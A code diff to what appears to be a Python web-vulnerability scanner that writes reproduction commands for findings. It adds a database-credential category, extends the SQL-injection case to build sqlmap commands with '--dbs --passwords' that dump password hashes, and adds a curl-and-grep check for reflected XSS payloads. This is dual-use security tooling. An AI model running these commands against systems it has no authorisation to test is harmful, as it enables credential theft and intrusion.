@@ -117,17 +117,31 @@ def script_for(f: dict) -> dict:
                 f"curl -sk '{url}'   # {url.split('/.git')[0]}/.git 外露\n")
         expect = "回應 .git 內容 → 可重建原始碼(見 web UI 的 ⤓ Dump .git)"
 
-    elif cat in ("secret-leak", "backup-leak", "info-leak", "api-leak", "admin-panel", "dir-listing"):
+    elif cat in ("secret-leak", "db-cred", "backup-leak", "info-leak", "api-leak", "admin-panel", "dir-listing"):
         body = f"curl -sk '{url}'   # 直接取回外露資源\n"
-        expect = "回應即洩漏內容"
+        expect = "回應即洩漏內容(DB 密碼 / 金鑰)" if cat == "db-cred" else "回應即洩漏內容"
 
     elif cat == "sqli":
-        body = f"sqlmap -u '{url}' --batch --random-agent --level 2 --risk 1\n"
-        expect = "sqlmap 確認注入點"
+        tech = ev.get("technique", "")
+        param = ev.get("parameter", "")
+        payload = ev.get("payload", "")
+        body = ((f"# technique={tech}  param={param}\n" if tech else "")
+                + (f"# payload={payload}\n" if payload else "")
+                + f"sqlmap -u '{url}' --batch --random-agent --level 2 --risk 1"
+                + (f" -p '{param}'" if param else "") + " --dbs --passwords\n")
+        expect = (f"sqlmap 確認注入({tech or 'sqli'});--passwords 嘗試 dump DB 帳密雜湊"
+                  if tech else "sqlmap 確認注入點")
 
     elif cat == "xss":
-        body = f"dalfox url '{url}' --only-poc\n"
-        expect = "反射點 PoC"
+        param = ev.get("parameter", "")
+        context = ev.get("context", "")
+        body = (f"# reflected XSS · context={context} · param={param}\n"
+                f"URL='{url}'\n"
+                "# 直接請求已注入的 URL;break-out 若原樣反射(未被 HTML 編碼)即可執行:\n"
+                "curl -sk \"$URL\" | grep -Ei 'onload=1|onerror=1|onfocus=1|ontoggle=1|onstart=1|<svg|<script>1|javascript:1' "
+                "&& echo '[+] VULNERABLE (break-out reflected un-encoded)' || echo '[-] encoded / blocked'\n"
+                "# 深入 PoC: dalfox url \"$URL\" --only-poc\n")
+        expect = "回應原樣含 onload=1 / <svg 等 break-out(未編碼)"
 
     elif cat == "weak-cred":
         svc = ev.get("service", ""); port = ev.get("port", "")
@@ -163,7 +177,7 @@ def _is_confirmed(f: dict) -> bool:
     return (f.get("category") == "cve"
             or (f.get("confidence") in ("confirmed", "high")
                 and f.get("severity") in ("critical", "high"))
-            or f.get("category") in ("secret-leak", "vcs-leak", "backup-leak",
+            or f.get("category") in ("secret-leak", "db-cred", "vcs-leak", "backup-leak",
                                      "admin-panel", "dir-listing", "weak-cred"))
 
 
